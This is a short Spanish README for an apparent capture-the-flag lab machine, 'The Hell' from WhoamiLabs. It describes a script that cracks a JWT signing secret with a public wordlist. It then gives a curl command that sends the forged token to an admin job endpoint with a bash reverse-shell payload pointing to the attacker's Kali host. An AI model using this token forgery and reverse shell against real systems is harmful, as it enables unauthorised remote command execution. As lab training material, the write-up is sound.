# Maquina-The-Hell-de-WhoamiLabs

El script ayuda a encontrar la palabra secreta para formar el token.
Al finalizar devuelve un comando con curl listo para correr en otra terminal.


# Comparto fichero con palabras clave para la prueba
https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list



curl -X POST http://172.17.0.2:3000/v1/admin/run-job \
  -H 'Authorization: Bearer pegar el que crea' \
  -H 'Content-Type: application/json' \
  -d '{"command": "bash -c '\''bash -i >& /dev/tcp/IP-KALI/PUERTO 0>&1'\''"}'
